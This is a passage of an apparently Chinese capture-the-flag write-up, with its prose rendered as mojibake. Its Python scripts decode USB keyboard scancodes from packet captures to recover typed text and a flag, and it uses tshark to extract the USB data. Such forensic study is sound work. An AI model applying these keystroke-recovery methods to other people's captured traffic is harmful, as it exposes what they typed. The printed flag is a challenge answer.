class="hljs-number">0x04</span>:<span class="hljs-string">&quot;A&quot;</span>,  <span class="hljs-number">0x05</span>:<span class="hljs-string">&quot;B&quot;</span>,  <span class="hljs-number">0x06</span>:<span class="hljs-string">&quot;C&quot;</span>, <span class="hljs-number">0x07</span>:<span class="hljs-string">&quot;D&quot;</span>, <span class="hljs-number">0x08</span>:<span class="hljs-string">&quot;E&quot;</span>, <span class="hljs-number">0x09</span>:<span class="hljs-string">&quot;F&quot;</span>, <span class="hljs-number">0x0A</span>:<span class="hljs-string">&quot;G&quot;</span>,  <span class="hljs-number">0x0B</span>:<span class="hljs-string">&quot;H&quot;</span>, <span class="hljs-number">0x0C</span>:<span class="hljs-string">&quot;I&quot;</span>,  <span class="hljs-number">0x0D</span>:<span class="hljs-string">&quot;J&quot;</span>, <span class="hljs-number">0x0E</span>:<span class="hljs-string">&quot;K&quot;</span>, <span class="hljs-number">0x0F</span>:<span class="hljs-string">&quot;L&quot;</span>, <span class="hljs-number">0x10</span>:<span class="hljs-string">&quot;M&quot;</span>, <span class="hljs-number">0x11</span>:<span class="hljs-string">&quot;N&quot;</span>,<span class="hljs-number">0x12</span>:<span class="hljs-string">&quot;O&quot;</span>,  <span class="hljs-number">0x13</span>:<span class="hljs-string">&quot;P&quot;</span>, <span class="hljs-number">0x14</span>:<span class="hljs-string">&quot;Q&quot;</span>, <span class="hljs-number">0x15</span>:<span class="hljs-string">&quot;R&quot;</span>, <span class="hljs-number">0x16</span>:<span class="hljs-string">&quot;S&quot;</span>, <span class="hljs-number">0x17</span>:<span class="hljs-string">&quot;T&quot;</span>, <span class="hljs-number">0x18</span>:<span class="hljs-string">&quot;U&quot;</span>,<span class="hljs-number">0x19</span>:<span class="hljs-string">&quot;V&quot;</span>, <span class="hljs-number">0x1A</span>:<span class="hljs-string">&quot;W&quot;</span>, <span class="hljs-number">0x1B</span>:<span class="hljs-string">&quot;X&quot;</span>, <span class="hljs-number">0x1C</span>:<span class="hljs-string">&quot;Y&quot;</span>, <span class="hljs-number">0x1D</span>:<span class="hljs-string">&quot;Z&quot;</span>, <span class="hljs-number">0x1E</span>:<span class="hljs-string">&quot;1&quot;</span>, <span class="hljs-number">0x1F</span>:<span class="hljs-string">&quot;2&quot;</span>, <span class="hljs-number">0x20</span>:<span class="hljs-string">&quot;3&quot;</span>, <span class="hljs-number">0x21</span>:<span class="hljs-string">&quot;4&quot;</span>, <span class="hljs-number">0x22</span>:<span class="hljs-string">&quot;5&quot;</span>,  <span class="hljs-number">0x23</span>:<span class="hljs-string">&quot;6&quot;</span>, <span class="hljs-number">0x24</span>:<span class="hljs-string">&quot;7&quot;</span>, <span class="hljs-number">0x25</span>:<span class="hljs-string">&quot;8&quot;</span>, <span class="hljs-number">0x26</span>:<span class="hljs-string">&quot;9&quot;</span>, <span class="hljs-number">0x27</span>:<span class="hljs-string">&quot;0&quot;</span>, <span class="hljs-number">0x28</span>:<span class="hljs-string">&quot;\n&quot;</span>, <span class="hljs-number">0x2a</span>:<span class="hljs-string">&quot;[DEL]&quot;</span>,  <span class="hljs-number">0X2B</span>:<span class="hljs-string">&quot;    &quot;</span>, <span class="hljs-number">0x2C</span>:<span class="hljs-string">&quot; &quot;</span>,  <span class="hljs-number">0x2D</span>:<span class="hljs-string">&quot;-&quot;</span>, <span class="hljs-number">0x2E</span>:<span class="hljs-string">&quot;=&quot;</span>, <span class="hljs-number">0x2F</span>:<span class="hljs-string">&quot;[&quot;</span>,  <span class="hljs-number">0x30</span>:<span class="hljs-string">&quot;]&quot;</span>,  <span class="hljs-number">0x31</span>:<span class="hljs-string">&quot;\\&quot;</span>, <span class="hljs-number">0x32</span>:<span class="hljs-string">&quot;~&quot;</span>, <span class="hljs-number">0x33</span>:<span class="hljs-string">&quot;;&quot;</span>,  <span class="hljs-number">0x34</span>:<span class="hljs-string">&quot;&#x27;&quot;</span>, <span class="hljs-number">0x36</span>:<span class="hljs-string">&quot;,&quot;</span>,  <span class="hljs-number">0x37</span>:<span class="hljs-string">&quot;.&quot;</span> &#125;<br><br>nums = []<br>keys = <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;out.txt&#x27;</span>)<br><span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> keys:<br>    <span class="hljs-keyword">if</span> line[<span class="hljs-number">0</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">or</span> line[<span class="hljs-number">1</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">or</span> line[<span class="hljs-number">3</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">or</span> line[<span class="hljs-number">4</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">or</span> line[<span class="hljs-number">9</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">or</span> line[<span class="hljs-number">10</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">or</span> line[<span class="hljs-number">12</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">or</span> line[<span class="hljs-number">13</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">or</span> line[<span class="hljs-number">15</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">or</span> line[<span class="hljs-number">16</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">or</span> line[<span class="hljs-number">18</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">or</span> line[<span class="hljs-number">19</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">or</span> line[<span class="hljs-number">21</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">or</span> line[<span class="hljs-number">22</span>]!=<span class="hljs-string">&#x27;0&#x27;</span>:<br>         <span class="hljs-keyword">continue</span><br>    nums.append(<span class="hljs-built_in">int</span>(line[<span class="hljs-number">6</span>:<span class="hljs-number">8</span>],<span class="hljs-number">16</span>))<br><br>keys.close()<br><br>output = <span class="hljs-string">&quot;&quot;</span><br><span class="hljs-keyword">for</span> n <span class="hljs-keyword">in</span> nums:<br>    <span class="hljs-keyword">if</span> n == <span class="hljs-number">0</span> :<br>        <span class="hljs-keyword">continue</span><br>    <span class="hljs-keyword">if</span> n <span class="hljs-keyword">in</span> mappings:<br>        output += mappings[n]<br>    <span class="hljs-keyword">else</span>:<br>        output += <span class="hljs-string">&#x27;[unknown]&#x27;</span><br><br><span class="hljs-built_in">print</span> <span class="hljs-string">&#x27;output :\n&#x27;</span> + output<br></code></pre></td></tr></table></figure><p>è¿è¡Œè„šæœ¬å¾—åˆ°ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">â”Œâ”€â”€(kaliã‰¿kali)-[~/æ¡Œé¢/Python/USB]<br>â””â”€$ python keyboard.py                 <br>output :<br>666C61677B3866396564326639333365662[DEL]31346138643035323364303334396531323939637D<br></code></pre></td></tr></table></figure><p>å› ä¸º[DEL]æ˜¯åˆ é™¤é”®ï¼Œæ‰€ä»¥</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">666C61677B38663965643266393333656631346138643035323364303334396531323939637D<br></code></pre></td></tr></table></figure><p>keyboard2.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><code class="hljs python">normalKeys = &#123;<br>    <span class="hljs-string">&quot;04&quot;</span>:<span class="hljs-string">&quot;a&quot;</span>, <span class="hljs-string">&quot;05&quot;</span>:<span class="hljs-string">&quot;b&quot;</span>, <span class="hljs-string">&quot;06&quot;</span>:<span class="hljs-string">&quot;c&quot;</span>, <span class="hljs-string">&quot;07&quot;</span>:<span class="hljs-string">&quot;d&quot;</span>, <span class="hljs-string">&quot;08&quot;</span>:<span class="hljs-string">&quot;e&quot;</span>,<br>    <span class="hljs-string">&quot;09&quot;</span>:<span class="hljs-string">&quot;f&quot;</span>, <span class="hljs-string">&quot;0a&quot;</span>:<span class="hljs-string">&quot;g&quot;</span>, <span class="hljs-string">&quot;0b&quot;</span>:<span class="hljs-string">&quot;h&quot;</span>, <span class="hljs-string">&quot;0c&quot;</span>:<span class="hljs-string">&quot;i&quot;</span>, <span class="hljs-string">&quot;0d&quot;</span>:<span class="hljs-string">&quot;j&quot;</span>,<br>     <span class="hljs-string">&quot;0e&quot;</span>:<span class="hljs-string">&quot;k&quot;</span>, <span class="hljs-string">&quot;0f&quot;</span>:<span class="hljs-string">&quot;l&quot;</span>, <span class="hljs-string">&quot;10&quot;</span>:<span class="hljs-string">&quot;m&quot;</span>, <span class="hljs-string">&quot;11&quot;</span>:<span class="hljs-string">&quot;n&quot;</span>, <span class="hljs-string">&quot;12&quot;</span>:<span class="hljs-string">&quot;o&quot;</span>,<br>      <span class="hljs-string">&quot;13&quot;</span>:<span class="hljs-string">&quot;p&quot;</span>, <span class="hljs-string">&quot;14&quot;</span>:<span class="hljs-string">&quot;q&quot;</span>, <span class="hljs-string">&quot;15&quot;</span>:<span class="hljs-string">&quot;r&quot;</span>, <span class="hljs-string">&quot;16&quot;</span>:<span class="hljs-string">&quot;s&quot;</span>, <span class="hljs-string">&quot;17&quot;</span>:<span class="hljs-string">&quot;t&quot;</span>,<br>       <span class="hljs-string">&quot;18&quot;</span>:<span class="hljs-string">&quot;u&quot;</span>, <span class="hljs-string">&quot;19&quot;</span>:<span class="hljs-string">&quot;v&quot;</span>, <span class="hljs-string">&quot;1a&quot;</span>:<span class="hljs-string">&quot;w&quot;</span>, <span class="hljs-string">&quot;1b&quot;</span>:<span class="hljs-string">&quot;x&quot;</span>, <span class="hljs-string">&quot;1c&quot;</span>:<span class="hljs-string">&quot;y&quot;</span>,<br>        <span class="hljs-string">&quot;1d&quot;</span>:<span class="hljs-string">&quot;z&quot;</span>,<span class="hljs-string">&quot;1e&quot;</span>:<span class="hljs-string">&quot;1&quot;</span>, <span class="hljs-string">&quot;1f&quot;</span>:<span class="hljs-string">&quot;2&quot;</span>, <span class="hljs-string">&quot;20&quot;</span>:<span class="hljs-string">&quot;3&quot;</span>, <span class="hljs-string">&quot;21&quot;</span>:<span class="hljs-string">&quot;4&quot;</span>,<br>         <span class="hljs-string">&quot;22&quot;</span>:<span class="hljs-string">&quot;5&quot;</span>, <span class="hljs-string">&quot;23&quot;</span>:<span class="hljs-string">&quot;6&quot;</span>,<span class="hljs-string">&quot;24&quot;</span>:<span class="hljs-string">&quot;7&quot;</span>,<span class="hljs-string">&quot;25&quot;</span>:<span class="hljs-string">&quot;8&quot;</span>,<span class="hljs-string">&quot;26&quot;</span>:<span class="hljs-string">&quot;9&quot;</span>,<br>         <span class="hljs-string">&quot;27&quot;</span>:<span class="hljs-string">&quot;0&quot;</span>,<span class="hljs-string">&quot;28&quot;</span>:<span class="hljs-string">&quot;&lt;RET&gt;&quot;</span>,<span class="hljs-string">&quot;29&quot;</span>:<span class="hljs-string">&quot;&lt;ESC&gt;&quot;</span>,<span class="hljs-string">&quot;2a&quot;</span>:<span class="hljs-string">&quot;&lt;DEL&gt;&quot;</span>, <span class="hljs-string">&quot;2b&quot;</span>:<span class="hljs-string">&quot;\t&quot;</span>,<br>         <span class="hljs-string">&quot;2c&quot;</span>:<span class="hljs-string">&quot;&lt;SPACE&gt;&quot;</span>,<span class="hljs-string">&quot;2d&quot;</span>:<span class="hljs-string">&quot;-&quot;</span>,<span class="hljs-string">&quot;2e&quot;</span>:<span class="hljs-string">&quot;=&quot;</span>,<span class="hljs-string">&quot;2f&quot;</span>:<span class="hljs-string">&quot;[&quot;</span>,<span class="hljs-string">&quot;30&quot;</span>:<span class="hljs-string">&quot;]&quot;</span>,<span class="hljs-string">&quot;31&quot;</span>:<span class="hljs-string">&quot;\\&quot;</span>,<br>         <span class="hljs-string">&quot;32&quot;</span>:<span class="hljs-string">&quot;&lt;NON&gt;&quot;</span>,<span class="hljs-string">&quot;33&quot;</span>:<span class="hljs-string">&quot;;&quot;</span>,<span class="hljs-string">&quot;34&quot;</span>:<span class="hljs-string">&quot;&#x27;&quot;</span>,<span class="hljs-string">&quot;35&quot;</span>:<span class="hljs-string">&quot;&lt;GA&gt;&quot;</span>,<span class="hljs-string">&quot;36&quot;</span>:<span class="hljs-string">&quot;,&quot;</span>,<span class="hljs-string">&quot;37&quot;</span>:<span class="hljs-string">&quot;.&quot;</span>,<br>         <span class="hljs-string">&quot;38&quot;</span>:<span class="hljs-string">&quot;/&quot;</span>,<span class="hljs-string">&quot;39&quot;</span>:<span class="hljs-string">&quot;&lt;CAP&gt;&quot;</span>,<span class="hljs-string">&quot;3a&quot;</span>:<span class="hljs-string">&quot;&lt;F1&gt;&quot;</span>,<span class="hljs-string">&quot;3b&quot;</span>:<span class="hljs-string">&quot;&lt;F2&gt;&quot;</span>, <span class="hljs-string">&quot;3c&quot;</span>:<span class="hljs-string">&quot;&lt;F3&gt;&quot;</span>,<span class="hljs-string">&quot;3d&quot;</span>:<span class="hljs-string">&quot;&lt;F4&gt;&quot;</span>,<br>         <span class="hljs-string">&quot;3e&quot;</span>:<span class="hljs-string">&quot;&lt;F5&gt;&quot;</span>,<span class="hljs-string">&quot;3f&quot;</span>:<span class="hljs-string">&quot;&lt;F6&gt;&quot;</span>,<span class="hljs-string">&quot;40&quot;</span>:<span class="hljs-string">&quot;&lt;F7&gt;&quot;</span>,<span class="hljs-string">&quot;41&quot;</span>:<span class="hljs-string">&quot;&lt;F8&gt;&quot;</span>,<span class="hljs-string">&quot;42&quot;</span>:<span class="hljs-string">&quot;&lt;F9&gt;&quot;</span>,<span class="hljs-string">&quot;43&quot;</span>:<span class="hljs-string">&quot;&lt;F10&gt;&quot;</span>,<br>         <span class="hljs-string">&quot;44&quot;</span>:<span class="hljs-string">&quot;&lt;F11&gt;&quot;</span>,<span class="hljs-string">&quot;45&quot;</span>:<span class="hljs-string">&quot;&lt;F12&gt;&quot;</span>&#125;<br>shiftKeys = &#123;<br>    <span class="hljs-string">&quot;04&quot;</span>:<span class="hljs-string">&quot;A&quot;</span>, <span class="hljs-string">&quot;05&quot;</span>:<span class="hljs-string">&quot;B&quot;</span>, <span class="hljs-string">&quot;06&quot;</span>:<span class="hljs-string">&quot;C&quot;</span>, <span class="hljs-string">&quot;07&quot;</span>:<span class="hljs-string">&quot;D&quot;</span>, <span class="hljs-string">&quot;08&quot;</span>:<span class="hljs-string">&quot;E&quot;</span>,<br>     <span class="hljs-string">&quot;09&quot;</span>:<span class="hljs-string">&quot;F&quot;</span>, <span class="hljs-string">&quot;0a&quot;</span>:<span class="hljs-string">&quot;G&quot;</span>, <span class="hljs-string">&quot;0b&quot;</span>:<span class="hljs-string">&quot;H&quot;</span>, <span class="hljs-string">&quot;0c&quot;</span>:<span class="hljs-string">&quot;I&quot;</span>, <span class="hljs-string">&quot;0d&quot;</span>:<span class="hljs-string">&quot;J&quot;</span>,<br>      <span class="hljs-string">&quot;0e&quot;</span>:<span class="hljs-string">&quot;K&quot;</span>, <span class="hljs-string">&quot;0f&quot;</span>:<span class="hljs-string">&quot;L&quot;</span>, <span class="hljs-string">&quot;10&quot;</span>:<span class="hljs-string">&quot;M&quot;</span>, <span class="hljs-string">&quot;11&quot;</span>:<span class="hljs-string">&quot;N&quot;</span>, <span class="hljs-string">&quot;12&quot;</span>:<span class="hljs-string">&quot;O&quot;</span>,<br>       <span class="hljs-string">&quot;13&quot;</span>:<span class="hljs-string">&quot;P&quot;</span>, <span class="hljs-string">&quot;14&quot;</span>:<span class="hljs-string">&quot;Q&quot;</span>, <span class="hljs-string">&quot;15&quot;</span>:<span class="hljs-string">&quot;R&quot;</span>, <span class="hljs-string">&quot;16&quot;</span>:<span class="hljs-string">&quot;S&quot;</span>, <span class="hljs-string">&quot;17&quot;</span>:<span class="hljs-string">&quot;T&quot;</span>,<br>        <span class="hljs-string">&quot;18&quot;</span>:<span class="hljs-string">&quot;U&quot;</span>, <span class="hljs-string">&quot;19&quot;</span>:<span class="hljs-string">&quot;V&quot;</span>, <span class="hljs-string">&quot;1a&quot;</span>:<span class="hljs-string">&quot;W&quot;</span>, <span class="hljs-string">&quot;1b&quot;</span>:<span class="hljs-string">&quot;X&quot;</span>, <span class="hljs-string">&quot;1c&quot;</span>:<span class="hljs-string">&quot;Y&quot;</span>,<br>         <span class="hljs-string">&quot;1d&quot;</span>:<span class="hljs-string">&quot;Z&quot;</span>,<span class="hljs-string">&quot;1e&quot;</span>:<span class="hljs-string">&quot;!&quot;</span>, <span class="hljs-string">&quot;1f&quot;</span>:<span class="hljs-string">&quot;@&quot;</span>, <span class="hljs-string">&quot;20&quot;</span>:<span class="hljs-string">&quot;#&quot;</span>, <span class="hljs-string">&quot;21&quot;</span>:<span class="hljs-string">&quot;$&quot;</span>,<br>          <span class="hljs-string">&quot;22&quot;</span>:<span class="hljs-string">&quot;%&quot;</span>, <span class="hljs-string">&quot;23&quot;</span>:<span class="hljs-string">&quot;^&quot;</span>,<span class="hljs-string">&quot;24&quot;</span>:<span class="hljs-string">&quot;&amp;&quot;</span>,<span class="hljs-string">&quot;25&quot;</span>:<span class="hljs-string">&quot;*&quot;</span>,<span class="hljs-string">&quot;26&quot;</span>:<span class="hljs-string">&quot;(&quot;</span>,<span class="hljs-string">&quot;27&quot;</span>:<span class="hljs-string">&quot;)&quot;</span>,<br>          <span class="hljs-string">&quot;28&quot;</span>:<span class="hljs-string">&quot;&lt;RET&gt;&quot;</span>,<span class="hljs-string">&quot;29&quot;</span>:<span class="hljs-string">&quot;&lt;ESC&gt;&quot;</span>,<span class="hljs-string">&quot;2a&quot;</span>:<span class="hljs-string">&quot;&lt;DEL&gt;&quot;</span>, <span class="hljs-string">&quot;2b&quot;</span>:<span class="hljs-string">&quot;\t&quot;</span>,<span class="hljs-string">&quot;2c&quot;</span>:<span class="hljs-string">&quot;&lt;SPACE&gt;&quot;</span>,<br>          <span class="hljs-string">&quot;2d&quot;</span>:<span class="hljs-string">&quot;_&quot;</span>,<span class="hljs-string">&quot;2e&quot;</span>:<span class="hljs-string">&quot;+&quot;</span>,<span class="hljs-string">&quot;2f&quot;</span>:<span class="hljs-string">&quot;&#123;&quot;</span>,<span class="hljs-string">&quot;30&quot;</span>:<span class="hljs-string">&quot;&#125;&quot;</span>,<span class="hljs-string">&quot;31&quot;</span>:<span class="hljs-string">&quot;|&quot;</span>,<span class="hljs-string">&quot;32&quot;</span>:<span class="hljs-string">&quot;&lt;NON&gt;&quot;</span>,<span class="hljs-string">&quot;33&quot;</span>:<span class="hljs-string">&quot;\&quot;&quot;</span>,<br>          <span class="hljs-string">&quot;34&quot;</span>:<span class="hljs-string">&quot;:&quot;</span>,<span class="hljs-string">&quot;35&quot;</span>:<span class="hljs-string">&quot;&lt;GA&gt;&quot;</span>,<span class="hljs-string">&quot;36&quot;</span>:<span class="hljs-string">&quot;&lt;&quot;</span>,<span class="hljs-string">&quot;37&quot;</span>:<span class="hljs-string">&quot;&gt;&quot;</span>,<span class="hljs-string">&quot;38&quot;</span>:<span class="hljs-string">&quot;?&quot;</span>,<span class="hljs-string">&quot;39&quot;</span>:<span class="hljs-string">&quot;&lt;CAP&gt;&quot;</span>,<span class="hljs-string">&quot;3a&quot;</span>:<span class="hljs-string">&quot;&lt;F1&gt;&quot;</span>,<br>          <span class="hljs-string">&quot;3b&quot;</span>:<span class="hljs-string">&quot;&lt;F2&gt;&quot;</span>, <span class="hljs-string">&quot;3c&quot;</span>:<span class="hljs-string">&quot;&lt;F3&gt;&quot;</span>,<span class="hljs-string">&quot;3d&quot;</span>:<span class="hljs-string">&quot;&lt;F4&gt;&quot;</span>,<span class="hljs-string">&quot;3e&quot;</span>:<span class="hljs-string">&quot;&lt;F5&gt;&quot;</span>,<span class="hljs-string">&quot;3f&quot;</span>:<span class="hljs-string">&quot;&lt;F6&gt;&quot;</span>,<span class="hljs-string">&quot;40&quot;</span>:<span class="hljs-string">&quot;&lt;F7&gt;&quot;</span>,<br>          <span class="hljs-string">&quot;41&quot;</span>:<span class="hljs-string">&quot;&lt;F8&gt;&quot;</span>,<span class="hljs-string">&quot;42&quot;</span>:<span class="hljs-string">&quot;&lt;F9&gt;&quot;</span>,<span class="hljs-string">&quot;43&quot;</span>:<span class="hljs-string">&quot;&lt;F10&gt;&quot;</span>,<span class="hljs-string">&quot;44&quot;</span>:<span class="hljs-string">&quot;&lt;F11&gt;&quot;</span>,<span class="hljs-string">&quot;45&quot;</span>:<span class="hljs-string">&quot;&lt;F12&gt;&quot;</span>&#125;<br>output = []<br>keys = <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;out.txt&#x27;</span>)<br><span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> keys:<br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-keyword">if</span> line[<span class="hljs-number">0</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">or</span> (line[<span class="hljs-number">1</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">and</span> line[<span class="hljs-number">1</span>]!=<span class="hljs-string">&#x27;2&#x27;</span>) <span class="hljs-keyword">or</span> line[<span class="hljs-number">3</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">or</span> line[<span class="hljs-number">4</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">or</span> line[<span class="hljs-number">9</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">or</span> line[<span class="hljs-number">10</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">or</span> line[<span class="hljs-number">12</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">or</span> line[<span class="hljs-number">13</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">or</span> line[<span class="hljs-number">15</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">or</span> line[<span class="hljs-number">16</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">or</span> line[<span class="hljs-number">18</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">or</span> line[<span class="hljs-number">19</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">or</span> line[<span class="hljs-number">21</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">or</span> line[<span class="hljs-number">22</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">or</span> line[<span class="hljs-number">6</span>:<span class="hljs-number">8</span>]==<span class="hljs-string">&quot;00&quot;</span>:<br>             <span class="hljs-keyword">continue</span><br>        <span class="hljs-keyword">if</span> line[<span class="hljs-number">6</span>:<span class="hljs-number">8</span>] <span class="hljs-keyword">in</span> normalKeys.keys():<br>            output += [[normalKeys[line[<span class="hljs-number">6</span>:<span class="hljs-number">8</span>]]],[shiftKeys[line[<span class="hljs-number">6</span>:<span class="hljs-number">8</span>]]]][line[<span class="hljs-number">1</span>]==<span class="hljs-string">&#x27;2&#x27;</span>]<br>        <span class="hljs-keyword">else</span>:<br>            output += [<span class="hljs-string">&#x27;[unknown]&#x27;</span>]<br>    <span class="hljs-keyword">except</span>:<br>        <span class="hljs-keyword">pass</span><br><br>keys.close()<br><br>flag=<span class="hljs-number">0</span><br>print(<span class="hljs-string">&quot;&quot;</span>.join(output))<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(output)):<br>    <span class="hljs-keyword">try</span>:<br>        a=output.index(<span class="hljs-string">&#x27;&lt;DEL&gt;&#x27;</span>)<br>        <span class="hljs-keyword">del</span> output[a]<br>        <span class="hljs-keyword">del</span> output[a-<span class="hljs-number">1</span>]<br>    <span class="hljs-keyword">except</span>:<br>        <span class="hljs-keyword">pass</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(output)):<br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-keyword">if</span> output[i]==<span class="hljs-string">&quot;&lt;CAP&gt;&quot;</span>:<br>            flag+=<span class="hljs-number">1</span><br>            output.pop(i)<br>            <span class="hljs-keyword">if</span> flag==<span class="hljs-number">2</span>:<br>                flag=<span class="hljs-number">0</span><br>        <span class="hljs-keyword">if</span> flag!=<span class="hljs-number">0</span>:<br>            output[i]=output[i].upper()<br>    <span class="hljs-keyword">except</span>:<br>        <span class="hljs-keyword">pass</span><br><br><span class="hljs-built_in">print</span> (<span class="hljs-string">&#x27;output :&#x27;</span> + <span class="hljs-string">&quot;&quot;</span>.join(output))<br></code></pre></td></tr></table></figure><p>è¿è¡Œè„šæœ¬å¾—åˆ°</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">â”Œâ”€â”€(kaliã‰¿kali)-[~/æ¡Œé¢/Python/USB]<br>â””â”€$ python keyboard2.py bingbing.pcapng      <br>666c61677b3866396564326639333365662&lt;DEL&gt;31346138643035323364303334396531323939637d<br>output :666c61677b38663965643266393333656631346138643035323364303334396531323939637d<br></code></pre></td></tr></table></figure><p>ä½¿ç”¨è„šæœ¬å°†åå…­è¿›åˆ¶è½¬æ¢ä¸ºå­—ç¬¦ä¸²</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">m=<span class="hljs-string">&quot;666C61677B38663965643266393333656631346138643035323364303334396531323939637D&quot;</span><br>s=bytes.fromhex(m)<br><span class="hljs-built_in">print</span>(s)<br></code></pre></td></tr></table></figure><p>å¾—åˆ°</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">b<span class="hljs-string">&#x27;flag&#123;8f9ed2f933ef14a8d0523d0349e1299c&#125;&#x27;</span><br></code></pre></td></tr></table></figure><p><strong>é¢˜ç›®2ï¼š</strong></p><p><img src="https://img-blog.csdnimg.cn/20210405115616535.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>æå–æµé‡</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">tshark -r key.pcap -T fields -e usb.capdata &gt; usbdata.txt<br></code></pre></td></tr></table></figure><p>æŸ¥çœ‹usbdata.txtå†…å®¹<br><img src="https://img-blog.csdnimg.cn/20210405120456614.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>è¿™æ˜¯æ‰¾åˆ°çš„ç¬¬ä¸‰ä¸ªè„šæœ¬<a href="https://github.com/WangYihang/UsbKeyboardDataHacker/blob/master/UsbKeyboardDataHacker.py">UsbKeyboardDataHacker.py</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span 